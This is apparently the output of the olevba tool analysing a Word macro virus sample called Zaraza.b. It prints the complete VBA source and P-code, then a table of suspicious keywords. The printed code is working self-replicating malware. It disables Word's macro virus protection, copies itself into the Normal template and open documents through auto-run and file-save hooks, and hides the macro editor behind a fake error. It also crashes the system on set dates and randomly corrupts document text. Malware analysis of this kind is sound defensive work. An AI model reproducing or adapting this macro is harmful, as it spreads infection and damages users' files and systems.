olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zaraza.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zaraza.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO zaraza.bas 
in file: Virus.MSWord.Zaraza.b - OLE stream: 'Macros/VBA/zaraza'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Attribute VB_Name = "zaraza"
' Version 2.0
    
Sub zaraza()
    On Error Resume Next
If Application.UserName <> "Predator" Then
    Randomize
    path_1 = "c:\windows\system\sys_z.drv"
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Call e
    ActiveDocument.ReadOnlyRecommended = False
    With Dialogs(wdDialogFileSummaryInfo)
      .Comments = "Created by Mad Max (c) 2002"
      .Execute
    End With
    infa = Int(Rnd * 10000)
    If infa = 26 Then Call zamena
    If Left(Date, 5) = "14.12" Or Left(Date, 5) = "28.08" Or Left(Date, 2) = "31" Or Left(Date, 2) = "30" Then Call zavis
            
    If Application.UserInitials = "M" Then UI = True
    If NormalTemplate.VBProject.VBComponents.Item("zaraza").Name <> "zaraza" Then nt = True
    If ActiveDocument.VBProject.VBComponents.Item("zaraza").Name <> "zaraza" Then ad = True
    If nt = True And ad = False Then Set impor_1 = NormalTemplate.VBProject.VBComponents
    If nt = False And ad = True Then Set impor_1 = ActiveDocument.VBProject.VBComponents
    impor_1.import path_1
    
    If activeinst = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
    If ad = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save

    End If
End Sub

Sub e()
    ActiveDocument.VBProject.VBComponents("zaraza").Export ("c:\windows\system\sys_z.drv")
End Sub

Sub AutoOpen()
    On Error Resume Next
    Call zaraza
End Sub

Sub AutoNew()
    On Error Resume Next
    Call zaraza
End Sub

Sub AutoClose()
    On Error Resume Next
    Call zaraza
End Sub

Sub HelpAbout()
    On Error Resume Next
    MsgBox "                   Hello It's Me :-) " + Chr(13) + _
           "This virus created by Mad Max (c) 2002" + Chr(13) + _
           "        Version - 2.0 from 09/11/2002"
End Sub

Sub FileSave()
    On Error Resume Next
    Call zaraza
    ActiveDocument.Save
End Sub

Sub FileSaveAs()
    On Error Resume Next
    Dialogs(wdDialogFileSaveAs).Show
    Call zaraza
End Sub

Sub FileTemplates()
    On Error Resume Next
    Call zaraza
    Call IR_
End Sub

Sub ToolsMacro()
    On Error Resume Next
    Call zaraza
    Call IR_
End Sub

Sub ViewVBCode()
    On Error Resume Next
    Call zaraza
    Call IR_
End Sub

Sub IR_()
    MsgBox "Internal Error"
    ActiveWindow.Close SaveChanges:=SaveChanges
End Sub


Sub zamena()
    On Error Resume Next
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "о"
            .Replacement.Text = "а"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = False
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
End Sub

' Если "вскроете", большая просьба отписать мне на мыло
' maxvolnov@inbox.ru и не кидать в меня камнями по поводу багов

Sub zavis()
    Dim visim
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
    visim = Shell("con\con", vbHide)
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Zaraza.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/zaraza - 6419 bytes
' Line #0:
' 	QuoteRem 0x0000 0x001D " Attribute VB_Name = "zaraza""
' Line #1:
' 	QuoteRem 0x0000 0x000C " Version 2.0"
' Line #2:
' Line #3:
' 	FuncDefn (Sub zaraza())
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' 	Ld Application 
' 	MemLd UserName 
' 	LitStr 0x0008 "Predator"
' 	Ne 
' 	IfBlock 
' Line #6:
' 	ArgsCall Read 0x0000 
' Line #7:
' 	LitStr 0x001B "c:\windows\system\sys_z.drv"
' 	St path_1 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #11:
' 	ArgsCall (Call) e 0x0000 
' Line #12:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #13:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #14:
' 	LitStr 0x001B "Created by Mad Max (c) 2002"
' 	MemStWith Comments 
' Line #15:
' 	ArgsMemCallWith Execute 0x0000 
' Line #16:
' 	EndWith 
' Line #17:
' 	Ld Rnd 
' 	LitDI2 0x2710 
' 	Mul 
' 	FnInt 
' 	St infa 
' Line #18:
' 	Ld infa 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) zamena 0x0000 
' 	EndIf 
' Line #19:
' 	Ld Date 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "14.12"
' 	Eq 
' 	Ld Date 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "28.08"
' 	Eq 
' 	Or 
' 	Ld Date 
' 	LitDI2 0x0002 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0002 "31"
' 	Eq 
' 	Or 
' 	Ld Date 
' 	LitDI2 0x0002 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0002 "30"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) zavis 0x0000 
' 	EndIf 
' Line #20:
' Line #21:
' 	Ld Application 
' 	MemLd UserInitials 
' 	LitStr 0x0001 "M"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St UI 
' 	EndIf 
' Line #22:
' 	LitStr 0x0006 "zaraza"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "zaraza"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St nt 
' 	EndIf 
' Line #23:
' 	LitStr 0x0006 "zaraza"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "zaraza"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ad 
' 	EndIf 
' Line #24:
' 	Ld nt 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ad 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set impor_1 
' 	EndIf 
' Line #25:
' 	Ld nt 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld ad 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set impor_1 
' 	EndIf 
' Line #26:
' 	Ld path_1 
' 	Ld impor_1 
' 	ArgsMemCall import 0x0001 
' Line #27:
' Line #28:
' 	Ld activeinst 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #29:
' 	Ld ad 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' 	EndIf 
' Line #30:
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	EndSub 
' Line #33:
' Line #34:
' 	FuncDefn (Sub e())
' Line #35:
' 	LitStr 0x001B "c:\windows\system\sys_z.drv"
' 	Paren 
' 	LitStr 0x0006 "zaraza"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #36:
' 	EndSub 
' Line #37:
' Line #38:
' 	FuncDefn (Sub AutoOpen())
' Line #39:
' 	OnError (Resume Next) 
' Line #40:
' 	ArgsCall (Call) zaraza 0x0000 
' Line #41:
' 	EndSub 
' Line #42:
' Line #43:
' 	FuncDefn (Sub AutoNew())
' Line #44:
' 	OnError (Resume Next) 
' Line #45:
' 	ArgsCall (Call) zaraza 0x0000 
' Line #46:
' 	EndSub 
' Line #47:
' Line #48:
' 	FuncDefn (Sub AutoClose())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) zaraza 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' Line #53:
' 	FuncDefn (Sub HelpAbout())
' Line #54:
' 	OnError (Resume Next) 
' Line #55:
' 	LineCont 0x0008 08 00 0B 00 0F 00 0B 00
' 	LitStr 0x0025 "                   Hello It's Me :-) "
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0026 "This virus created by Mad Max (c) 2002"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0025 "        Version - 2.0 from 09/11/2002"
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' Line #56:
' 	EndSub 
' Line #57:
' Line #58:
' 	FuncDefn (Sub FileSave())
' Line #59:
' 	OnError (Resume Next) 
' Line #60:
' 	ArgsCall (Call) zaraza 0x0000 
' Line #61:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #62:
' 	EndSub 
' Line #63:
' Line #64:
' 	FuncDefn (Sub FileSaveAs())
' Line #65:
' 	OnError (Resume Next) 
' Line #66:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #67:
' 	ArgsCall (Call) zaraza 0x0000 
' Line #68:
' 	EndSub 
' Line #69:
' Line #70:
' 	FuncDefn (Sub FileTemplates())
' Line #71:
' 	OnError (Resume Next) 
' Line #72:
' 	ArgsCall (Call) zaraza 0x0000 
' Line #73:
' 	ArgsCall (Call) IR_ 0x0000 
' Line #74:
' 	EndSub 
' Line #75:
' Line #76:
' 	FuncDefn (Sub ToolsMacro())
' Line #77:
' 	OnError (Resume Next) 
' Line #78:
' 	ArgsCall (Call) zaraza 0x0000 
' Line #79:
' 	ArgsCall (Call) IR_ 0x0000 
' Line #80:
' 	EndSub 
' Line #81:
' Line #82:
' 	FuncDefn (Sub ViewVBCode())
' Line #83:
' 	OnError (Resume Next) 
' Line #84:
' 	ArgsCall (Call) zaraza 0x0000 
' Line #85:
' 	ArgsCall (Call) IR_ 0x0000 
' Line #86:
' 	EndSub 
' Line #87:
' Line #88:
' 	FuncDefn (Sub IR_())
' Line #89:
' 	LitStr 0x000E "Internal Error"
' 	ArgsCall MsgBox 0x0001 
' Line #90:
' 	Ld SaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld ActiveWindow 
' 	ArgsMemCall Close 0x0001 
' Line #91:
' 	EndSub 
' Line #92:
' Line #93:
' Line #94:
' 	FuncDefn (Sub zamena())
' Line #95:
' 	OnError (Resume Next) 
' Line #96:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #97:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #98:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #99:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #100:
' 	LitStr 0x0001 "о"
' 	MemStWith Then 
' Line #101:
' 	LitStr 0x0001 "а"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #102:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #103:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #104:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #105:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #106:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #107:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #108:
' 	EndWith 
' Line #109:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #110:
' 	EndSub 
' Line #111:
' Line #112:
' 	QuoteRem 0x0000 0x0036 " Если "вскроете", большая просьба отписать мне на мыло"
' Line #113:
' 	QuoteRem 0x0000 0x003E " maxvolnov@inbox.ru и не кидать в меня камнями по поводу багов"
' Line #114:
' Line #115:
' 	FuncDefn (Sub zavis())
' Line #116:
' 	Dim 
' 	VarDefn visim
' Line #117:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #118:
' 	LitStr 0x0007 "con\con"
' 	Ld vbHide 
' 	ArgsLd Shell 0x0002 
' 	St visim 
' Line #119:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

